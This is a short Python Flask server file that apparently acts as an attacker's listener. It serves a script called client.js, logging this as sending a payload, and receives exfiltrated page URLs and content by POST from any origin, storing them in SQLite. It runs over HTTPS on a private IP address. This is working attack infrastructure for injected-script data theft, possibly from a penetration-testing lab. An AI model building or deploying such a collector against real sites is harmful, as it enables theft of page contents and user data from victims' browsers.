from flask import Flask, request, send_file, abort
from flask_cors import CORS
from db import create_connection, insert_content, create_db

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"

@app.route("/client.js", methods=["GET"])
def client_js():
    print("[+] Sending payload.")
    return send_file("./client.js")

@app.route("/post_content", methods=["POST"])
def post_content():
    if (request.form["url"] and request.form["content"]):
        try:
            conn = create_connection(database)
            insert_content(conn, request.form["url"], request.form["content"])
            return ""
        except Exception as e:
            print(e) 
            abort(500)

app.run(host="192.168.45.248", port=443, ssl_context=("cert.pem", "key.pem"))
